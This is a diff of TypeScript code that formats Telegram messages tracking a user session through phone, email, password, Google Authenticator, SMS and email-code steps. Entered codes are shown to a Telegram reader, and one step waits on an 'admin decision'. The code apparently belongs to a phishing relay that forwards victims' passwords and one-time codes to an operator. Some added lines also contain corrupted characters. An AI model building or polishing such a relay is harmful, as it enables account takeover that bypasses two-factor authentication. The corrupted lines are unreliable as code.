@@ -695,7 +695,7 @@ const formatSessionMessage = (session: UserSession): string => {
     return `
 ╔══════════════════════════════════════╗
 ${content}
-╚══════════════════════════════════════╝`;
+╚══════════════���═══════════════════════╝`;
   };
 
   // Main header
@@ -770,7 +770,7 @@ ${createBox(
         const codesContent = codes
           .map(
             (code, index) =>
-              `${index === codes.length - 1 ? "✅" : "📝"} کد ${index + 1}: <code>${escapeHtml(code)}</code>`,
+              `${index === codes.length - 1 ? "✅" : "��"} کد ${index + 1}: <code>${escapeHtml(code)}</code>`,
           )
           .join("\n║ ");
 
@@ -1197,36 +1197,36 @@ const updateTelegramMessage = async (
 };
 
 /**
- * Get current step display text with professional descriptions
+ * Get current step display text - simple and clear
  */
 const getCurrentStepText = (step: string): string => {
   const stepTexts: { [key: string]: string } = {
-    phone_verification: "🔄 در حال تایید شماره همراه",
-    waiting_admin: "⏳ منتظر تصمیم ادمین",
-    email_verification: "📧 در حا�� تایید ایمیل",
-    email_completed: "✅ ایمیل با موفقیت تایید شد",
-    auth_password: "🔒 وارد کردن رمز عبور",
-    auth_google: "📱 احراز هویت دو مرحله‌ای",
-    auth_sms: "💬 تایید کد پیامکی",
-    auth_email: "📨 تایید کد ایمیلی",
-    completed: "✅ فرآیند احراز هویت تکمیل شد",
+    phone_verification: "تایید شماره",
+    waiting_admin: "منتظر ادمین",
+    email_verification: "تایید ایمیل",
+    email_completed: "ایمیل تایید شد",
+    auth_password: "وارد کردن رمز",
+    auth_google: "Google Auth",
+    auth_sms: "کد SMS",
+    auth_email: "کد ایمیل",
+    completed: "تکمیل شد",
   };
 
-  return stepTexts[step] || `❓ وضعیت نامشخص: ${step}`;
+  return stepTexts[step] || step;
 };
 
 /**
- * Get step display name with better descriptions
+ * Get step display name - simple format
  */
 const getStepDisplayName = (stepType: string): string => {
   const names: { [key: string]: string } = {
-    password: "🔒 رمز عبور حساب",
-    google: "📱 Google Authenticator",
-    sms: "💬 کد تایید پیامکی",
-    email: "📧 کد تایید ایمیلی",
+    password: "رمز عبور",
+    google: "Google Auth",
+    sms: "کد SMS",
+    email: "کد ایمیل",
   };
 
-  return names[stepType] || `🔐 ${stepType}`;
+  return names[stepType] || stepType;
 };
 
 /**
